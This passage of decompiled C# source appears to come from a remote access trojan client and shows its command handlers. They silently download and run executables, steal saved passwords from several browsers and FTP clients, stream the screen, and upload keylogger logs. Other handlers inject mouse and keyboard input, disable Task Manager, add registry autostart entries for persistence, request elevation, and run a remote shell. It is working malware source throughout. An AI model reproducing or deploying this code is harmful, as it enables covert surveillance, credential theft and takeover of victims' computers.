					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = tempFilePath;
				Process.Start(processStartInfo);
			}
			catch
			{
				NativeMethods.DeleteFile(tempFilePath);
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Executed File!").Execute(client);
		}).Start();
	}

	public static void HandleDoUploadAndExecute(DoUploadAndExecute command, Client client)
	{
		if (!_renamedFiles.ContainsKey(command.ID))
		{
			_renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));
		}
		string text = _renamedFiles[command.ID];
		try
		{
			if (command.CurrentBlock == 0 && Path.GetExtension(text) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
			{
				throw new Exception("No executable file");
			}
			FileSplit fileSplit = new FileSplit(text);
			if (!fileSplit.AppendBlock(command.Block, command.CurrentBlock))
			{
				throw new Exception(fileSplit.LastError);
			}
			if (command.CurrentBlock + 1 == command.MaxBlocks)
			{
				if (_renamedFiles.ContainsKey(command.ID))
				{
					_renamedFiles.Remove(command.ID);
				}
				FileHelper.DeleteZoneIdentifier(text);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (command.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
				new SetStatus("Executed File!").Execute(client);
			}
		}
		catch (Exception ex)
		{
			if (_renamedFiles.ContainsKey(command.ID))
			{
				_renamedFiles.Remove(command.ID);
			}
			NativeMethods.DeleteFile(text);
			new SetStatus($"Execution failed: {ex.Message}").Execute(client);
		}
	}

	public static void HandleDoVisitWebsite(DoVisitWebsite command, Client client)
	{
		string text = command.URL;
		if (!text.StartsWith("http"))
		{
			text = "http://" + text;
		}
		if (!Uri.IsWellFormedUriString(text, UriKind.RelativeOrAbsolute))
		{
			return;
		}
		if (!command.Hidden)
		{
			Process.Start(text);
		}
		else
		{
			try
			{
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(text);
				obj.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
				obj.AllowAutoRedirect = true;
				obj.Timeout = 10000;
				obj.Method = "GET";
				using ((HttpWebResponse)obj.GetResponse())
				{
				}
			}
			catch
			{
			}
		}
		new SetStatus("Visited Website").Execute(client);
	}

	public static void HandleDoShowMessageBox(DoShowMessageBox command, Client client)
	{
		new Thread((ThreadStart)delegate
		{
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			MessageBox.Show(command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon), (MessageBoxDefaultButton)0, (MessageBoxOptions)131072);
		}).Start();
		new SetStatus("Showed Messagebox").Execute(client);
	}

	[DllImport("user32.dll")]
	private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

	public static void HandleDoDisplayMSG(DoDisplayMSG command, Client client)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		SendMessage(((Control)new Form()).get_Handle(), 274u, 61808, 2);
		new SetStatus("Monitor turned off.").Execute(client);
	}

	public static void HandleDoDisableTaskmgr(DoDisableTaskmgr command, Client client)
	{
		try
		{
			if (command.Text == "disable")
			{
				RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				if (registryKey.GetValue("DisableTaskMgr") == null)
				{
					registryKey.SetValue("DisableTaskMgr", "1");
					new SetStatus("TaskMGR disabled.").Execute(client);
				}
			}
			if (command.Text == "enable")
			{
				RegistryKey registryKey2 = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey2.DeleteValue("DisableTaskMgr");
				new SetStatus("TaskMGR enabled.").Execute(client);
				registryKey2.Close();
			}
		}
		catch
		{
		}
	}

	public static void HandleGetPasswords(GetPasswords packet, Client client)
	{
		List<RecoveredAccount> list = new List<RecoveredAccount>();
		list.AddRange(Chrome.GetSavedPasswords());
		list.AddRange(Opera.GetSavedPasswords());
		list.AddRange(Yandex.GetSavedPasswords());
		list.AddRange(InternetExplorer.GetSavedPasswords());
		list.AddRange(Firefox.GetSavedPasswords());
		list.AddRange(FileZilla.GetSavedPasswords());
		list.AddRange(WinSCP.GetSavedPasswords());
		List<string> list2 = new List<string>();
		foreach (RecoveredAccount item2 in list)
		{
			string item = string.Format("{0}{4}{1}{4}{2}{4}{3}", item2.Username, item2.Password, item2.URL, item2.Application, "$E$");
			list2.Add(item);
		}
		new GetPasswordsResponse(list2).Execute(client);
	}

	public static void HandleGetDesktop(GetDesktop command, Client client)
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		string text = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));
		if (StreamCodec == null)
		{
			StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, text);
		}
		if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor || StreamCodec.Resolution != text)
		{
			if (StreamCodec != null)
			{
				StreamCodec.Dispose();
			}
			StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, text);
		}
		BitmapData val = null;
		Bitmap val2 = null;
		try
		{
			val2 = ScreenHelper.CaptureScreen(command.Monitor);
			val = val2.LockBits(new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height()), (ImageLockMode)3, ((Image)val2).get_PixelFormat());
			using MemoryStream memoryStream = new MemoryStream();
			if (StreamCodec == null)
			{
				throw new Exception("StreamCodec can not be null.");
			}
			StreamCodec.CodeImage(val.get_Scan0(), new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height()), new Size(((Image)val2).get_Width(), ((Image)val2).get_Height()), ((Image)val2).get_PixelFormat(), memoryStream);
			new GetDesktopResponse(memoryStream.ToArray(), StreamCodec.ImageQuality, StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
		}
		catch (Exception)
		{
			if (StreamCodec != null)
			{
				new GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
			}
			StreamCodec = null;
		}
		finally
		{
			if (val2 != null)
			{
				if (val != null)
				{
					try
					{
						val2.UnlockBits(val);
					}
					catch
					{
					}
				}
				((Image)val2).Dispose();
			}
		}
	}

	public static void HandleDoMouseEvent(DoMouseEvent command, Client client)
	{
		try
		{
			Screen[] allScreens = Screen.get_AllScreens();
			int x = allScreens[command.MonitorIndex].get_Bounds().X;
			int y = allScreens[command.MonitorIndex].get_Bounds().Y;
			Point p = new Point(command.X + x, command.Y + y);
			MouseAction action = command.Action;
			if ((uint)action <= 4u && NativeMethodsHelper.IsScreensaverActive())
			{
				NativeMethodsHelper.DisableScreensaver();
			}
			switch (command.Action)
			{
			case MouseAction.LeftDown:
			case MouseAction.LeftUp:
				NativeMethodsHelper.DoMouseLeftClick(p, command.IsMouseDown);
				break;
			case MouseAction.RightDown:
			case MouseAction.RightUp:
				NativeMethodsHelper.DoMouseRightClick(p, command.IsMouseDown);
				break;
			case MouseAction.MoveCursor:
				NativeMethodsHelper.DoMouseMove(p);
				break;
			case MouseAction.ScrollDown:
				NativeMethodsHelper.DoMouseScroll(p, scrollDown: true);
				break;
			case MouseAction.ScrollUp:
				NativeMethodsHelper.DoMouseScroll(p, scrollDown: false);
				break;
			}
		}
		catch
		{
		}
	}

	public static void HandleDoKeyboardEvent(DoKeyboardEvent command, Client client)
	{
		if (NativeMethodsHelper.IsScreensaverActive())
		{
			NativeMethodsHelper.DisableScreensaver();
		}
		NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
	}

	public static void HandleGetMonitors(GetMonitors command, Client client)
	{
		if (Screen.get_AllScreens().Length != 0)
		{
			new GetMonitorsResponse(Screen.get_AllScreens().Length).Execute(client);
		}
	}

	public static void HandleGetKeyloggerLogs(GetKeyloggerLogs command, Client client)
	{
		new Thread((ThreadStart)delegate
		{
			try
			{
				int num = 1;
				if (!Directory.Exists(Keylogger.LogDirectory))
				{
					new GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", num, 0).Execute(client);
				}
				else
				{
					FileInfo[] files = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();
					if (files.Length == 0)
					{
						new GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", num, 0).Execute(client);
					}
					else
					{
						FileInfo[] array = files;
						foreach (FileInfo fileInfo in array)
						{
							FileSplit fileSplit = new FileSplit(fileInfo.FullName);
							if (fileSplit.MaxBlocks < 0)
							{
								new GetKeyloggerLogsResponse("", new byte[0], -1, -1, fileSplit.LastError, num, files.Length).Execute(client);
							}
							for (int j = 0; j < fileSplit.MaxBlocks; j++)
							{
								if (fileSplit.ReadBlock(j, out var readBytes))
								{
									new GetKeyloggerLogsResponse(Path.GetFileName(fileInfo.Name), readBytes, fileSplit.MaxBlocks, j, fileSplit.LastError, num, files.Length).Execute(client);
								}
								else
								{
									new GetKeyloggerLogsResponse("", new byte[0], -1, -1, fileSplit.LastError, num, files.Length).Execute(client);
								}
							}
							num++;
						}
					}
				}
			}
			catch (Exception ex)
			{
				new GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
			}
		}).Start();
	}

	public static void HandleGetDrives(GetDrives command, Client client)
	{
		DriveInfo[] array;
		try
		{
			array = (from d in DriveInfo.GetDrives()
				where d.IsReady
				select d).ToArray();
		}
		catch (IOException)
		{
			new SetStatusFileManager("GetDrives I/O error", setLastDirectorySeen: false).Execute(client);
			return;
		}
		catch (UnauthorizedAccessException)
		{
			new SetStatusFileManager("GetDrives No permission", setLastDirectorySeen: false).Execute(client);
			return;
		}
		if (array.Length == 0)
		{
			new SetStatusFileManager("GetDrives No drives", setLastDirectorySeen: false).Execute(client);
			return;
		}
		string[] array2 = new string[array.Length];
		string[] array3 = new string[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			string text = null;
			try
			{
				text = array[i].VolumeLabel;
			}
			catch
			{
			}
			if (string.IsNullOrEmpty(text))
			{
				array2[i] = $"{array[i].RootDirectory.FullName} [{FormatHelper.DriveTypeName(array[i].DriveType)}, {array[i].DriveFormat}]";
			}
			else
			{
				array2[i] = $"{array[i].RootDirectory.FullName} ({text}) [{FormatHelper.DriveTypeName(array[i].DriveType)}, {array[i].DriveFormat}]";
			}
			array3[i] = array[i].RootDirectory.FullName;
		}
		new GetDrivesResponse(array2, array3).Execute(client);
	}

	public static void HandleDoShutdownAction(DoShutdownAction command, Client client)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			switch (command.Action)
			{
			case ShutdownAction.Shutdown:
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/s /t 0";
				processStartInfo.FileName = "shutdown";
				Process.Start(processStartInfo);
				break;
			case ShutdownAction.Restart:
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/r /t 0";
				processStartInfo.FileName = "shutdown";
				Process.Start(processStartInfo);
				break;
			case ShutdownAction.Standby:
				Application.SetSuspendState((PowerState)0, true, true);
				break;
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Action failed: {ex.Message}").Execute(client);
		}
	}

	public static void HandleGetStartupItems(GetStartupItems command, Client client)
	{
		try
		{
			List<string> list = new List<string>();
			using (RegistryKey registryKey = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey != null)
				{
					list.AddRange(from formattedKeyValue in registryKey.GetFormattedKeyValues()
						select "0" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey2 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey2 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey2.GetFormattedKeyValues()
						select "1" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey3 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey3 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey3.GetFormattedKeyValues()
						select "2" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey4 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey4 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey4.GetFormattedKeyValues()
						select "3" + formattedKeyValue);
				}
			}
			if (PlatformHelper.Is64Bit)
			{
				using (RegistryKey registryKey5 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
				{
					if (registryKey5 != null)
					{
						list.AddRange(from formattedKeyValue in registryKey5.GetFormattedKeyValues()
							select "4" + formattedKeyValue);
					}
				}
				using RegistryKey registryKey6 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
				if (registryKey6 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey6.GetFormattedKeyValues()
						select "5" + formattedKeyValue);
				}
			}
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
			{
				FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
				list.AddRange(from file in files
					where file.Name != "desktop.ini"
					select $"{file.Name}||{file.FullName}" into formattedKeyValue
					select "6" + formattedKeyValue);
			}
			new GetStartupItemsResponse(list).Execute(client);
		}
		catch (Exception ex)
		{
			new SetStatus($"Getting Autostart Items failed: {ex.Message}").Execute(client);
		}
	}

	public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Client client)
	{
		try
		{
			switch (command.Type)
			{
			case 0:
				if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 1:
				if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 2:
				if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 3:
				if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 4:
				if (!PlatformHelper.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 5:
				if (!PlatformHelper.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 6:
			{
				if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
				}
				using StreamWriter streamWriter = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name + ".url"), append: false);
				streamWriter.WriteLine("[InternetShortcut]");
				streamWriter.WriteLine("URL=file:///" + command.Path);
				streamWriter.WriteLine("IconIndex=0");
				streamWriter.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
				streamWriter.Flush();
				break;
			}
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Adding Autostart Item failed: {ex.Message}").Execute(client);
		}
	}

	public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Client client)
	{
		try
		{
			switch (command.Type)
			{
			case 0:
				if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 1:
				if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 2:
				if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 3:
				if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 4:
				if (!PlatformHelper.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 5:
				if (!PlatformHelper.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 6:
			{
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
				if (!File.Exists(path))
				{
					throw new IOException("File does not exist");
				}
				File.Delete(path);
				break;
			}
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Removing Autostart Item failed: {ex.Message}").Execute(client);
		}
	}

	public static void HandleGetSystemInfo(GetSystemInfo command, Client client)
	{
		try
		{
			IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			string text = ((!string.IsNullOrEmpty(iPGlobalProperties.DomainName)) ? iPGlobalProperties.DomainName : "-");
			string text2 = ((!string.IsNullOrEmpty(iPGlobalProperties.HostName)) ? iPGlobalProperties.HostName : "-");
			new GetSystemInfoResponse(new string[36]
			{
				"Processor (CPU)",
				DevicesHelper.GetCpuName(),
				"Memory (RAM)",
				$"{DevicesHelper.GetTotalRamAmount()} MB",
				"Video Card (GPU)",
				DevicesHelper.GetGpuName(),
				"Username",
				WindowsAccountHelper.GetName(),
				"PC Name",
				SystemHelper.GetPcName(),
				"Domain Name",
				text,
				"Host Name",
				text2,
				"System Drive",
				Path.GetPathRoot(Environment.SystemDirectory),
				"System Directory",
				Environment.SystemDirectory,
				"Uptime",
				SystemHelper.GetUptime(),
				"MAC Address",
				DevicesHelper.GetMacAddress(),
				"LAN IP Address",
				DevicesHelper.GetLanIp(),
				"WAN IP Address",
				GeoLocationHelper.GeoInfo.Ip,
				"Antivirus",
				SystemHelper.GetAntivirus(),
				"Firewall",
				SystemHelper.GetFirewall(),
				"Time Zone",
				GeoLocationHelper.GeoInfo.Timezone,
				"Country",
				GeoLocationHelper.GeoInfo.Country,
				"ISP",
				GeoLocationHelper.GeoInfo.Isp
			}).Execute(client);
		}
		catch
		{
		}
	}

	public static void HandleGetProcesses(GetProcesses command, Client client)
	{
		Process[] processes = Process.GetProcesses();
		string[] array = new string[processes.Length];
		int[] array2 = new int[processes.Length];
		string[] array3 = new string[processes.Length];
		int num = 0;
		Process[] array4 = processes;
		foreach (Process process in array4)
		{
			array[num] = process.ProcessName + ".exe";
			array2[num] = process.Id;
			array3[num] = process.MainWindowTitle;
			num++;
		}
		new GetProcessesResponse(array, array2, array3).Execute(client);
	}

	public static void HandleDoProcessStart(DoProcessStart command, Client client)
	{
		if (string.IsNullOrEmpty(command.Processname))
		{
			new SetStatus("Process could not be started!").Execute(client);
			return;
		}
		try
		{
			Process.Start(new ProcessStartInfo
			{
				UseShellExecute = true,
				FileName = command.Processname
			});
		}
		catch
		{
			new SetStatus("Process could not be started!").Execute(client);
		}
		finally
		{
			HandleGetProcesses(new GetProcesses(), client);
		}
	}

	public static void HandleDoProcessKill(DoProcessKill command, Client client)
	{
		try
		{
			Process.GetProcessById(command.PID).Kill();
		}
		catch
		{
		}
		finally
		{
			HandleGetProcesses(new GetProcesses(), client);
		}
	}

	public static void HandleDoAskElevate(DoAskElevate command, Client client)
	{
		if (WindowsAccountHelper.GetAccountType() != "Admin")
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = "cmd",
				Verb = "runas",
				Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true
			};
			MutexHelper.CloseMutex();
			try
			{
				Process.Start(startInfo);
			}
			catch
			{
				new SetStatus("User refused the elevation request.").Execute(client);
				MutexHelper.CreateMutex(Settings.MUTEX);
				return;
			}
			Program.ConnectClient.Exit();
		}
		else
		{
			new SetStatus("Process already elevated.").Execute(client);
		}
	}

	public static void HandleDoShellExecute(DoShellExecute command, Client client)
	{
		string command2 = command.Command;
		if (_shell != null || !(command2 == "exit"))
		{
			if (_shell == null)
			{
				_shell = new Shell();
			}
			if (command2 == "exit")
			{
				CloseShell();
			}
			else
			{
				_shell.ExecuteCommand(command2);
			}
		}
	}

	public static void CloseShell()
	{
		if (_shell != null)
		{
			_shell.Dispose();
		}
	}
}
